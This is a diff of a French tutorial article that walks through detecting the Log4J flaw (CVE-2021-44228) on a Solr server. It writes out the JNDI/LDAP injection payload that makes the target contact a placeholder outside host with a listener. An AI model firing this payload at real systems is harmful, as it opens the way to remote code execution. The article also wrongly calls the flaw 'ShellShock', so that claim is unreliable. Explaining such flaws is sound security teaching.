@@ -16,7 +16,7 @@ Cet article vise à expliquer la faille de sécurite ShellShock, en aucun cas le
 
 # Analyse de la faille Log4J (CVE-2021-44228)
 
-Pas besoin d'être un professionnel ddu monde cyber pour avoir entendu parler de cette faille qui a mis créer des quelques sueurs froides ces derniers jours.
+Pas besoin d'être un professionnel du monde cyber pour avoir entendu parler de cette faille qui a crée quelques sueurs froides ces derniers jours.
 
 Connue sous le nom de CVE-2021-44228, ou plus communément "ShellShock" de par son impact étendu, cette faille notée 10 (sur 10 !) par le scoring CVSS permet un _Remote Code Execution_ en exploitant le système de log basé sur Java : Log4J.
 
@@ -29,21 +29,21 @@ Voici un bref récapitulatif de l'attaque :
 
 # Reconnaissance de la faille
 
-Cette faille se retrouve sur bon nombre d'applications, puisque Log4J est très répandue pour la création de logs. Pour cette attaque, je me base sur l'application Solr, qui utilise une version vulnérable de Log4J.
+Cette faille se retrouve sur bon nombre d'applications, puisque Log4J est très répandue pour la gestion de logs. Pour cette attaque, je me base sur l'application Solr, qui utilise une version vulnérable de Log4J.
 
 ![2](https://user-images.githubusercontent.com/16634117/145869688-87433bd9-c133-41de-bd0d-43588d5e01a1.PNG)
 
 Un petit tour sur l'application et on remarque rapidement que l'application Log4J est présente dans les arguments de l'application. 
 
-Il faut maintenant savoir si cette version est vulnérable, pour ça, il faut trouver un point d'injection. Le plus simple est de jeter un oeil aux logs de l'application :
+Il faut maintenant savoir si cette version est vulnérable, pour ça, il faut trouver un point d'injection. Le plus simple est de jeter un œil aux logs de l'application :
 
 ![example_logs](https://user-images.githubusercontent.com/16634117/145869966-14f8f7bf-995c-470a-a6e8-dc4a334a5edb.png)
 
-Ici, on voit clairement que les requêtes GET sont journalisées ; l'url, mais également **les paramètres**. (C'est sur ce point que l'exploit peut changer, suivant la journalisation en place, il existera des points d'injection de code ou pas.)
+Ici, on voit clairement que les requêtes GET sont journalisées ; l'url, mais également **les paramètres**. (C'est sur ce point que l'exploit peut changer, suivant la journalisation en place, il existera des points d'injections différents : paramètres, headers HTTP, etc.)
 
 Pour identifier la vulnérabilité du système, j'injecte un paramètre GET avec la charge utile suivante (expliquée dans la présentation de la faille) :
 
-`{jndi:ldap://<IP>:<PORT>}`
+`${jndi:ldap://<IP>:<PORT>}`
 
 ![5](https://user-images.githubusercontent.com/16634117/145870531-750a9523-9d1c-4b0d-b523-af4b2d1e669e.png)
 _L'injection, avec un listener pour récupérer la connexion, permettant de vérifier la bonne exécution de la charge utile_
